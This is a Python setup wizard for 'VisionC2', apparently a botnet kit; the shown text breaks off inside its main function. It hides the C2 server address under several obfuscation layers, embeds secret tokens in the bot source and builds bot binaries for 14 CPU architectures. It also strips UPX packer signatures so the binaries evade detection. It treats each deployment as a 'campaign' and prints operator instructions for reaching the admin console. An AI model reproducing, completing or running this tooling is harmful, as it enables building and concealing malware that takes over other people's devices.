#!/usr/bin/env python3
"""
VisionC2 - Interactive Setup Script
====================================
Automates the complete setup process:
- Generates random protocol version and magic code
- Obfuscates C2 address using XOR+Base64
- Generates TLS certificates
- Updates CNC and Bot source code
- Builds all components

Author: Syn2Much
"""

import os
import sys
import re
import random
import string
import base64
import subprocess
import shutil
from datetime import datetime


# ANSI Colors
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    """Print the setup banner"""
    clear_screen()
    banner = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}
    ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗ ██████╗██████╗ 
    ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚════██╗
    ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║██║      █████╔╝
    ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██║     ██╔═══╝ 
     ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║╚██████╗███████╗
      ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝
{Colors.RESET}
{Colors.BRIGHT_CYAN}              ═══════════════════════════════════════
                    {Colors.BRIGHT_YELLOW}Interactive Setup Wizard{Colors.BRIGHT_CYAN}
              ═══════════════════════════════════════{Colors.RESET}
"""
    print(banner)


def print_step(step_num: int, total: int, title: str):
    """Print a step header"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET} {Colors.BRIGHT_YELLOW}Step {step_num}/{total}:{Colors.RESET} {Colors.BRIGHT_WHITE}{title:<47}{Colors.RESET}{Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )


def success(msg: str):
    print(f"{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")


def error(msg: str):
    print(f"{Colors.BRIGHT_RED}[✗]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")


def info(msg: str):
    print(f"{Colors.BRIGHT_BLUE}[i]{Colors.RESET} {Colors.BLUE}{msg}{Colors.RESET}")


def warning(msg: str):
    print(f"{Colors.BRIGHT_YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")


def print_info_box(title: str, lines: list):
    """Print a styled information box"""
    width = 62
    print(f"\n{Colors.BRIGHT_BLUE}┌{'─' * width}┐{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {Colors.BRIGHT_YELLOW}{title:<{width-1}}{Colors.RESET}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_BLUE}├{'─' * width}┤{Colors.RESET}")
    for line in lines:
        # Handle empty lines
        if not line:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET}{' ' * width}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
        else:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {line:<{width-1}}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
    print(f"{Colors.BRIGHT_BLUE}└{'─' * width}┘{Colors.RESET}\n")


def prompt(msg: str, default: str = None) -> str:
    """Get user input with styled prompt"""
    if default:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg} [{Colors.DIM}{default}{Colors.RESET}]: "
    else:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg}: "

    value = input(display).strip()
    return value if value else default


def confirm(msg: str, default: bool = True) -> bool:
    """Get yes/no confirmation"""
    default_str = "Y/n" if default else "y/N"
    response = (
        input(f"{Colors.BRIGHT_YELLOW}?{Colors.RESET} {msg} [{default_str}]: ")
        .strip()
        .lower()
    )

    if not response:
        return default
    return response in ["y", "yes"]


def generate_magic_code(length: int = 16) -> str:
    """Generate a random magic code with mixed characters"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return "".join(random.choice(chars) for _ in range(length))


def generate_protocol_version() -> str:
    """Generate a random protocol version"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 99)

    formats = [
        f"v{major}.{minor}",
        f"v{major}.{minor}.{patch}",
        f"proto{major}{minor}",
        f"V{major}_{minor}",
        f"r{major}.{minor}-stable",
    ]
    return random.choice(formats)


def generate_crypt_seed() -> str:
    """Generate random 8-char hex seed for encryption"""
    return "".join(random.choice("0123456789abcdef") for _ in range(8))


def derive_key_py(seed: str) -> bytes:
    """Python implementation of key derivation (must match Go)"""
    import hashlib

    # Must match Go's mew/mewtwo/celebi/jirachi functions
    dk = bytes(
        [
            0x31 ^ 0x64,  # mew()
            0x72 ^ 0x17,  # mewtwo()
            0x93 ^ 0xC6,  # celebi()
            0xA4 ^ 0x81,  # jirachi()
        ]
    )

    h = hashlib.md5()
    h.update(seed.encode())
    h.update(dk)

    # Add time-invariant entropy
    entropy = bytearray([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
    for i in range(len(entropy)):
        entropy[i] ^= (len(seed) + i * 17) & 0xFF
    h.update(bytes(entropy))

    return h.digest()


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4-like stream cipher (same as Go streamDecrypt)"""
    # Initialize S-box
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    # Generate keystream and encrypt
    result = bytearray(len(data))
    i, j = 0, 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        result[k] = data[k] ^ s[(s[i] + s[j]) % 256]

    return bytes(result)


def obfuscate_c2(c2_address: str, crypt_seed: str) -> str:
    """
    Multi-layer obfuscation matching Go decoder:
    1. Add MD5 checksum (4 bytes)
    2. Byte substitution
    3. RC4 stream encrypt
    4. XOR with derived key
    5. Base64 encode
    """
    import hashlib

    payload = c2_address.encode()

    # Add checksum (last 4 bytes of MD5)
    h = hashlib.md5()
    h.update(payload)
    checksum = h.digest()[:4]
    data = payload + checksum

    # Layer 4 (reverse): Byte substitution
    substituted = bytearray(len(data))
    for i in range(len(data)):
        b = data[i]
        b ^= 0xAA
        b = ((b >> 3) | (b << 5)) & 0xFF  # Rotate left 5
        substituted[i] = b

    # Layer 3 (reverse): RC4 stream encrypt
    key = derive_key_py(crypt_seed)
    rc4_encrypted = rc4_encrypt(bytes(substituted), key)

    # Layer 2 (reverse): XOR with rotating key
    xored = bytearray(len(rc4_encrypted))
    for i in range(len(rc4_encrypted)):
        xored[i] = rc4_encrypted[i] ^ key[i % len(key)]

    # Layer 1 (reverse): Base64 encode
    return base64.b64encode(bytes(xored)).decode()


def verify_obfuscation(encoded: str, crypt_seed: str, expected: str) -> bool:
    """Verify by simulating Go decoder"""
    import hashlib

    try:
        # Layer 1: Base64 decode
        layer1 = base64.b64decode(encoded)

        # Layer 2: XOR with rotating key
        key = derive_key_py(crypt_seed)
        layer2 = bytearray(len(layer1))
        for i in range(len(layer1)):
            layer2[i] = layer1[i] ^ key[i % len(key)]

        # Layer 3: RC4 decrypt
        layer3 = rc4_encrypt(bytes(layer2), key)  # RC4 is symmetric

        # Layer 4: Reverse byte substitution
        result = bytearray(len(layer3))
        for i in range(len(layer3)):
            b = layer3[i]
            b = ((b << 3) | (b >> 5)) & 0xFF  # Rotate right 5
            b ^= 0xAA
            result[i] = b

        # Verify checksum
        if len(result) < 5:
            return False

        payload = bytes(result[:-4])
        checksum = bytes(result[-4:])

        h = hashlib.md5()
        h.update(payload)
        expected_checksum = h.digest()[:4]

        if checksum != expected_checksum:
            return False

        return payload.decode() == expected
    except Exception as e:
        print(f"Verification error: {e}")
        return False


def update_cnc_main_go(
    cnc_path: str, magic_code: str, protocol_version: str, admin_port: str
):
    """Update the CNC main.go file with new values"""
    main_go_path = os.path.join(cnc_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update MAGIC_CODE
    content = re.sub(
        r'MAGIC_CODE\s*=\s*"[^"]*"', f'MAGIC_CODE       = "{magic_code}"', content
    )

    # Update PROTOCOL_VERSION
    content = re.sub(
        r'PROTOCOL_VERSION\s*=\s*"[^"]*"',
        f'PROTOCOL_VERSION = "{protocol_version}"',
        content,
    )

    # Update USER_SERVER_PORT
    content = re.sub(
        r'USER_SERVER_PORT\s*=\s*"[^"]*"', f'USER_SERVER_PORT = "{admin_port}"', content
    )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
    """Update the debugMode variable in Bot main.go"""
    main_go_path = os.path.join(bot_path, "main.go")

    try:
        with open(main_go_path, "r") as f:
            content = f.read()

        debug_value = "true" if debug_enabled else "false"
        content = re.sub(
            r"var debugMode\s*=\s*(true|false)",
            f"var debugMode = {debug_value}",
            content,
        )

        with open(main_go_path, "w") as f:
            f.write(content)

        return True
    except Exception as e:
        error(f"Failed to update debug mode: {e}")
        return False


def prompt_debug_mode() -> bool:
    """Prompt user to set debug mode with explanation"""
    print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
    print(
        f"{Colors.DIM}   Logs function calls & connections to console (dev only){Colors.RESET}\n"
    )
    return confirm("Would you like to enable debug mode?", default=False)


def update_bot_main_go(
    bot_path: str,
    magic_code: str,
    protocol_version: str,
    obfuscated_c2: str,
    crypt_seed: str,
):
    """Update the Bot main.go file with new values"""
    main_go_path = os.path.join(bot_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update gothTits (obfuscated C2)
    content = re.sub(
        r'const gothTits\s*=\s*"[^"]*"', f'const gothTits = "{obfuscated_c2}"', content
    )

    # Update cryptSeed
    content = re.sub(
        r'const cryptSeed\s*=\s*"[^"]*"', f'const cryptSeed = "{crypt_seed}"', content
    )

    # Update magicCode
    content = re.sub(
        r'magicCode\s*=\s*"[^"]*"', f'magicCode       = "{magic_code}"', content
    )

    # Update protocolVersion
    content = re.sub(
        r'protocolVersion\s*=\s*"[^"]*"',
        f'protocolVersion = "{protocol_version}"',
        content,
    )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
    """Generate TLS certificates"""
    try:
        key_path = os.path.join(cnc_path, "./certificates/server.key")
        cert_path = os.path.join(cnc_path, "./certificates/server.crt")

        # Generate private key
        info("Generating 4096-bit RSA private key...")
        subprocess.run(
            ["openssl", "genrsa", "-out", key_path, "4096"],
            check=True,
            capture_output=True,
        )

        # Generate certificate
        info("Generating self-signed certificate...")
        subject = f"/C={cert_config['country']}/ST={cert_config['state']}/L={cert_config['city']}/O={cert_config['org']}/CN={cert_config['cn']}"

        subprocess.run(
            [
                "openssl",
                "req",
                "-new",
                "-x509",
                "-sha256",
                "-key",
                key_path,
                "-out",
                cert_path,
                "-days",
                str(cert_config["days"]),
                "-subj",
                subject,
            ],
            check=True,
            capture_output=True,
        )

        return True
    except subprocess.CalledProcessError as e:
        error(f"Failed to generate certificates: {e}")
        return False
    except FileNotFoundError:
        error("OpenSSL not found. Please install: apt install openssl")
        return False


def build_cnc(cnc_path: str) -> bool:
    """Build the CNC server"""
    try:
        info("Building CNC server...")
        result = subprocess.run(
            ["go", "build", "-ldflags=-s -w", "-o", "cnc", "."],
            cwd=cnc_path,
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            error(f"Build failed: {result.stderr}")
            return False

        # Copy binary to main directory as 'server'
        base_path = os.path.dirname(cnc_path)
        src = os.path.join(cnc_path, "cnc")
        dst = os.path.join(base_path, "server")
        shutil.copy2(src, dst)
        info(f"Copied CNC binary to {dst}")

        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.23+")
        return False


def build_bots(bot_path: str) -> bool:
    """Build bot binaries using build.sh"""
    try:
        build_script = os.path.join(bot_path, "build.sh")

        # Make build.sh executable
        os.chmod(build_script, 0o755)

        info("Building bot binaries for 14 architectures...")
        info("This may take a few minutes...")
        print()

        result = subprocess.run(["bash", "build.sh"], cwd=bot_path, text=True)

        return result.returncode == 0
    except Exception as e:
        error(f"Build failed: {e}")
        return False


def deupx_binaries(bot_path: str) -> bool:
    """Strip UPX signatures from packed binaries using deUPX.py"""
    try:
        deupx_script = os.path.join(bot_path, "deUPX.py")
        bins_dir = os.path.join(bot_path, "bins")

        if not os.path.exists(deupx_script):
            warning(f"deUPX.py not found at {deupx_script}")
            return False

        if not os.path.exists(bins_dir):
            warning(f"bins directory not found at {bins_dir}")
            return False

        info("Stripping UPX signatures from packed binaries...")
        result = subprocess.run(
            [sys.executable, deupx_script, bins_dir], cwd=bot_path, text=True
        )

        return result.returncode == 0
    except Exception as e:
        error(f"deUPX failed: {e}")
        return False


def save_config(base_path: str, config: dict):
    """Save configuration to a file for reference"""
    config_path = os.path.join(base_path, "setup_config.txt")

    with open(config_path, "w") as f:
        f.write("=" * 60 + "\n")
        f.write("VisionC2 Configuration\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

        f.write("[C2 Server]\n")
        f.write(f"C2 Address: {config['c2_address']}\n")
        f.write(f"Admin Port: {config['admin_port']}\n")
        f.write(f"Bot Port: 443\n\n")

        f.write("[Security]\n")
        f.write(f"Magic Code: {config['magic_code']}\n")
        f.write(f"Protocol Version: {config['protocol_version']}\n")
        f.write(f"Crypt Seed: {config['crypt_seed']}\n")
        f.write(f"Obfuscated C2: {config['obfuscated_c2']}\n\n")

        f.write("[Certificate]\n")
        f.write(f"Country: {config['cert']['country']}\n")
        f.write(f"State: {config['cert']['state']}\n")
        f.write(f"City: {config['cert']['city']}\n")
        f.write(f"Organization: {config['cert']['org']}\n")
        f.write(f"Common Name: {config['cert']['cn']}\n")
        f.write(f"Valid Days: {config['cert']['days']}\n\n")

        f.write("[Usage]\n")
        f.write("1. Start CNC: ./server\n")
        f.write(
            f"2. Connect Admin(multi user mode): nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
        )
        f.write("3. Login trigger(multi user mode): spamtec\n")
        f.write("4. Bot binaries: bot/bins/\n")

    return config_path


def print_summary(config: dict):
    """Print final setup summary with all configuration details"""
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    print(
        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('c2_address', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    print()

    print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
    print(f"    1. Start CNC:    {Colors.GREEN}cd cnc && ./server{Colors.RESET}")
    c2_ip = config.get("c2_address", "localhost:443").split(":")[0]
    admin_port = config.get("admin_port", "420")
    print(f"    2. Connect:      {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}")
    print(f"    3. Login:        {Colors.GREEN}spamtec{Colors.RESET}")
    print(f"    4. Bot bins:     {Colors.GREEN}bot/bins/{Colors.RESET}")
    print()


def get_current_config(bot_path: str, cnc_path: str) -> dict:
    """Extract current configuration from source files"""
    config = {}

    # Read bot/main.go
    bot_main = os.path.join(bot_path, "main.go")
    if os.path.exists(bot_main):
        with open(bot_main, "r") as f:
            content = f.read()

            # Extract magicCode
            match = re.search(r'magicCode\s*=\s*"([^"]*)"', content)
            if match:
                config["magic_code"] = match.group(1)

            # Extract protocolVersion
            match = re.search(r'protocolVersion\s*=\s*"([^"]*)"', content)
            if match:
                config["protocol_version"] = match.group(1)

            # Extract cryptSeed
            match = re.search(r'const cryptSeed\s*=\s*"([^"]*)"', content)
            if match:
                config["crypt_seed"] = match.group(1)

    # Read cnc/main.go for admin port
    cnc_main = os.path.join(cnc_path, "main.go")
    if os.path.exists(cnc_main):
        with open(cnc_main, "r") as f:
            content = f.read()

            match = re.search(r'USER_SERVER_PORT\s*=\s*"([^"]*)"', content)
            if match:
                config["admin_port"] = match.group(1)

    return config


def print_menu():
    """Print the main menu"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                 {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full Setup{Colors.RESET}                                           {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} New C2 address (IP or domain)                     {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new magic code & protocol version        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new TLS certificates                     {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Build CNC server & bot binaries                   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Fresh install, new campaign{Colors.RESET}                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}C2 URL Update Only{Colors.RESET}                                   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Change C2 domain or IP address                    {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Keep existing magic code & certificates           {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}└─{Colors.RESET} Rebuild bot binaries only                         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Server migration, domain change{Colors.RESET}            {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                                  {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}"
    )

    # Print quick feature summary
    print(
        f"\n{Colors.DIM}  📡 Supports: Direct IP, Domain (A record), or TXT record C2{Colors.RESET}"
    )
    print(f"{Colors.DIM}  🔒 Bot→C2 encrypted via TLS 1.3 on port 443{Colors.RESET}")
    print(
        f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n"
    )

    choice = prompt("Select option", "1")
    return choice


def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
    """Run full setup - everything new"""
    config = {}

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()
    config["debug_mode"] = debug_enabled

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Step 1: C2 Address
    print_step(1, 5, "C2 Server Configuration")

    print(
        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
    )

    c2_ip = prompt("What is your C2 server IP or domain?", "127.0.0.1")
    c2_address = f"{c2_ip}:443"
    config["c2_address"] = c2_address

    admin_port = prompt("What port would you like for admin CLI?", "420")
    config["admin_port"] = admin_port

    print()
    success(f"C2: {c2_address} | Admin port: {admin_port}")

    # Step 2: Security Tokens
    print_step(2, 5, "Security Token Generation")

    magic_code = generate_magic_code(16)
    protocol_version = generate_protocol_version()
    crypt_seed = generate_crypt_seed()

    success(f"Magic: {magic_code}")
    success(f"Protocol: {protocol_version}")
    success(f"Crypt seed: {crypt_seed}")

    config["magic_code"] = magic_code
    config["protocol_version"] = protocol_version
    config["crypt_seed"] = crypt_seed

    # Obfuscate C2
    info("Applying multi-layer obfuscation...")
    obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
    config["obfuscated_c2"] = obfuscated_c2

    if verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
        success("C2 address obfuscation verified ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Step 3: Certificates
    print_step(3, 5, "TLS Certificates")

    print(
        f"{Colors.DIM}   TLS certs are required. You can self-sign here or use Let's Encrypt/your own.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Place your own certs at: cnc/certificates/server.crt and cnc/certificates/server.key{Colors.RESET}\n"
    )

    print(f"  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Generate self-signed certificates")
    print(
        f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} I'll provide my own (Let's Encrypt, etc.)\n"
    )

    cert_choice = prompt("Select option", "1")

    if cert_choice == "1":
        print(
            f"\n{Colors.DIM}   Enter certificate details (press Enter for defaults):{Colors.RESET}\n"
        )
        cert_config = {
            "country": prompt("Country code (2 letter)", "US"),
            "state": prompt("State/Province", "California"),
            "city": prompt("City", "San Francisco"),
            "org": prompt("Organization", "Security Research"),
            "cn": prompt("Common Name (domain)", c2_ip),
            "days": int(prompt("Valid days", "365")),
        }
        config["cert"] = cert_config

        if not generate_certificates(cnc_path, cert_config):
            error("Certificate generation failed!")
            if not confirm("Would you like to continue anyway?"):
                sys.exit(1)
        else:
            success("Self-signed TLS certificates generated")
    else:
        config["cert"] = {"custom": True}
        warning("Remember to place server.crt and server.key in cnc/ folder")

    # Step 4: Update Source
    print_step(4, 5, "Updating Source Code")

    print(
        f"{Colors.DIM}   Applying your configuration to source files...{Colors.RESET}\n"
    )

    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
        success("CNC configured")
    else:
        error("Failed to update CNC")

    if update_bot_main_go(
        bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed
    ):
        success("Bot configured")
    else:
        error("Failed to update Bot")

    if update_bot_debug_mode(bot_path, config["debug_mode"]):
        success(f"Debug mode: {'ON' if config['debug_mode'] else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    # Step 5: Build
    print_step(5, 5, "Building Binaries")

    if confirm("Would you like to build the CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed - build manually with: cd cnc && go build")

    if confirm(
        "Would you like to build bot binaries? (14 architectures, takes a few mins)"
    ):
        if build_bots(bot_path):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bot/bins/")

    # Save config
    config_file = save_config(base_path, config)
    info(f"Configuration saved to: {config_file}")

    print_summary(config)


def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
    """Update C2 URL only - keep existing magic code, protocol, certs"""

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Get existing config
    info("Reading existing configuration...")
    existing = get_current_config(bot_path, cnc_path)

    if not existing.get("magic_code") or not existing.get("crypt_seed"):
        error("Could not read existing configuration!")
        error("Please run Full Setup instead.")
        return

    print()
    info(
        f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Protocol: {Colors.BRIGHT_WHITE}{existing.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Admin Port: {Colors.BRIGHT_WHITE}{existing.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print()

    config = {}
    config["magic_code"] = existing["magic_code"]
    config["protocol_version"] = existing["protocol_version"]
    config["crypt_seed"] = existing["crypt_seed"]
    config["admin_port"] = existing.get("admin_port", "420")

    # Step 1: New C2 Address
    print_step(1, 2, "New C2 Address")

    print(
        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}\n"
    )

    c2_ip = prompt("What is your new C2 server IP or domain?")
    if not c2_ip:
        error("C2 address is required!")
        return

    c2_address = f"{c2_ip}:443"
    config["c2_address"] = c2_address

    success(f"New C2: {c2_address}")

    # Obfuscate with existing crypt_seed
    obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
    config["obfuscated_c2"] = obfuscated_c2

    if verify_obfuscation(obfuscated_c2, config["crypt_seed"], c2_address):
        success("C2 address obfuscation verified ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Step 2: Update & Build
    print_step(2, 2, "Update & Build")

    print(f"{Colors.DIM}   Applying new C2 address to bot source...{Colors.RESET}\n")

    if update_bot_main_go(
        bot_path,
        config["magic_code"],
        config["protocol_version"],
        obfuscated_c2,
        config["crypt_seed"],
    ):
        success("Bot configured")
    else:
        error("Failed to update Bot")

    if update_bot_debug_mode(bot_path, debug_enabled):
        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    if confirm("Would you like to build bot binaries? (takes a few mins)"):
        if build_bots(bot_path):
            success("Bot binaries built")
        else:
            warning("Bot build had issues - check bot/bins/")

    # Summary
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ C2 URL UPDATE COMPLETE!{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    print(
        f"  {Colors.YELLOW}New C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
    )
    print()
    warning("Deploy new bot binaries from bot/bins/")
    warning("Existing bots will NOT auto-update - redeploy required")
    print()


def main():
    """Main setup wizard"""
    print_banner()

    # Get base path
    base_path = os.path.dirname(os.path.abspath(__file__))
    cnc_path = os.path.join(base_path, "cnc")
    bot_path = os.path.join(base_path, "bot")

    # Verify paths exist
    if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
        error("Cannot find cnc/ or bot/ directories. Run this from VisionC2 root.")
        sys.exit(1)

    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")

    # Show menu
    choice = print_menu()

    if choice == "1":
        info("Starting Full Setup...")
        run_full_setup(base_path, cnc_path, bot_path)
    elif choice == "2":
